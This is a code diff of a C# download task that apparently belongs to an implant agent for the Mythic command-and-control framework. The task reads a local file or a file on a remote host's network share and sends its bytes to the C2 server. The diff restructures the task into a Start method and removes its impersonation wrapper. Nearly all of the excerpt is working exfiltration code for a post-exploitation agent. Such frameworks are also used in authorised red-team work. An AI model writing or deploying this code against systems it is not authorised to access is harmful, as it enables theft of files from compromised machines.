@@ -36,42 +36,36 @@ namespace Tasks
 
         }
 
-        public override void Kill()
+        public override void Start()
         {
-            _cancellationToken.Cancel();
-        }
-
-        public override System.Threading.Tasks.Task CreateTasking()
-        {
-            return new System.Threading.Tasks.Task(() =>
+            TaskResponse resp;
+            try
             {
-                TaskResponse resp;
-                try
+                DownloadParameters parameters = _jsonSerializer.Deserialize<DownloadParameters>(_data.Parameters);
+                if (string.IsNullOrEmpty(parameters.Hostname) && !File.Exists(parameters.FileName))
                 {
-                    DownloadParameters parameters = _jsonSerializer.Deserialize<DownloadParameters>(_data.Parameters);
-                    if (string.IsNullOrEmpty(parameters.Hostname) && !File.Exists(parameters.FileName))
+                    resp = CreateTaskResponse(
+                        $"File '{parameters.FileName}' does not exist.",
+                        true,
+                        "error");
+                }
+                else
+                {
+                    string path = string.IsNullOrEmpty(parameters.Hostname)
+                        ? parameters.FileName
+                        : $@"\\{parameters.Hostname}\{parameters.FileName}";
+                    byte[] fileBytes = new byte[0];
+                    fileBytes = File.ReadAllBytes(path);
+
+                    IMythicMessage[] artifacts = new IMythicMessage[1]
                     {
-                        resp = CreateTaskResponse(
-                            $"File '{parameters.FileName}' does not exist.",
-                            true,
-                            "error");
-                    } else
-                    {
-                        string path = string.IsNullOrEmpty(parameters.Hostname) ? parameters.FileName : $@"\\{parameters.Hostname}\{parameters.FileName}";
-                        byte[] fileBytes = new byte[0];
-                        using (_agent.GetIdentityManager().GetCurrentImpersonationIdentity().Impersonate())
+                        new Artifact
                         {
-                            fileBytes = File.ReadAllBytes(path);   
+                            BaseArtifact = "FileOpen",
+                            ArtifactDetails = path
                         }
-                        IMythicMessage[] artifacts = new IMythicMessage[1]
-                        {
-                            new Artifact
-                            {
-                                BaseArtifact = "FileOpen",
-                                ArtifactDetails = path
-                            }
-                        };
-                        if (_agent.GetFileManager().PutFile(
+                    };
+                    if (_agent.GetFileManager().PutFile(
                             _cancellationToken.Token,
                             _data.ID,
                             fileBytes,
@@ -79,22 +73,24 @@ namespace Tasks
                             out string mythicFileId,
                             false,
                             parameters.Hostname))
-                        {
-                            resp = CreateTaskResponse(mythicFileId, true, "completed", artifacts);
-                        } else
-                        {
-                            resp = CreateTaskResponse(
-                                $"Download of {path} failed or aborted.",
-                                true,
-                                "error", artifacts);
-                        }
+                    {
+                        resp = CreateTaskResponse(mythicFileId, true, "completed", artifacts);
                     }
-                } catch (Exception ex)
-                {
-                    resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
+                    else
+                    {
+                        resp = CreateTaskResponse(
+                            $"Download of {path} failed or aborted.",
+                            true,
+                            "error", artifacts);
+                    }
                 }
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-            }, _cancellationToken.Token);
+            }
+            catch (Exception ex)
+            {
+                resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
+            }
+
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
     }
 }
